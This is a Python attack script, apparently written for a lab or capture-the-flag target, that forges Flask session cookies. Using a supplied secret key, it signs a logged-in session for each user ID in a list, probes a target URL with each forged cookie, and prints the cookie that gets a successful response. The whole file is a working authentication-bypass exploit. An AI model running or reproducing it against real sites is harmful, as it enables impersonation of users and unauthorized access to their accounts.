#!/usr/bin/env python3
"""
probe_sign_once.py
------------------
Reads user_ids from a file, signs a Flask session cookie for each using the provided secret,
and performs exactly ONE HTTP GET request to the target URL with that cookie.

Behavior:
 - Performs one request per user_id (or only the line specified with --line).
 - Stops immediately when a probe returns success (HTTP 200-399).
 - When successful, prints the full signed cookie (and a short preview).
"""

import argparse
from flask import Flask
import requests
import sys
from typing import Tuple


def get_signer(secret_key: str):
    """Return Flask signer used for session cookies."""
    app = Flask(__name__)
    app.secret_key = secret_key
    signer = app.session_interface.get_signing_serializer(app)
    if signer is None:
        raise RuntimeError("Failed to obtain Flask signing serializer")
    return signer


def sign_session(secret_key: str, user_id: str, username: str) -> str:
    """Create signed Flask session cookie for given user_id and username."""
    signer = get_signer(secret_key)
    payload = {"is_logged_in": True, "user_id": user_id, "username": username}
    return signer.dumps(payload)


def probe_once(target: str, cookie_name: str, cookie_value: str) -> Tuple[bool, int]:
    """
    Send one GET request with the signed cookie and return (success_bool, status_code).
    success_bool is True when HTTP status is 200-399.
    """
    try:
        r = requests.get(target, cookies={cookie_name: cookie_value}, timeout=5)
        status = r.status_code
        if 200 <= status < 400:
            print("[+] SUCCESS: valid cookie!")
            return True, status
        else:
            return False, status
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False, -1


def cookie_preview(cookie_value: str, max_len: int = 80) -> str:
    if len(cookie_value) <= max_len:
        return cookie_value
    return cookie_value[:36] + "..." + cookie_value[-36:]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret", required=True, help="Flask secret key")
    parser.add_argument("--username", default="lalala", help="Username to include")
    parser.add_argument("--userfile", default="user_ids.txt", help="File with user IDs")
    parser.add_argument("--line", type=int, help="Specific line number (1-based) to use")
    parser.add_argument("--target", default="http://localhost:5000/", help="Target URL")
    parser.add_argument("--cookie-name", default="session", help="Cookie name (default: session)")
    args = parser.parse_args()

    # Load user IDs
    try:
        with open(args.userfile, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        sys.exit(f"[-] File not found: {args.userfile}")

    if not lines:
        sys.exit(f"[-] No user IDs found in {args.userfile}")

    # Determine which IDs to use
    if args.line:
        idx = args.line - 1
        if idx < 0 or idx >= len(lines):
            sys.exit(f"[-] Invalid line number: {args.line} (file has {len(lines)} lines)")
        selected = [lines[idx]]
    else:
        selected = lines

    print(f"[*] Loaded {len(selected)} user_id(s). Will perform one request per ID.\n")

    for uid in selected:
        try:
            cookie_value = sign_session(args.secret, uid, args.username)

            success, status = probe_once(args.target, args.cookie_name, cookie_value)
            if success:
                # Print full cookie on success
                print("\n[!!!] VALID COOKIE FOUND — full cookie below:\n")
                print(cookie_value)
                break
        except Exception as e:
            print(f"    [!] Error: {e}")
        print("-" * 60)


if __name__ == "__main__":
    main()
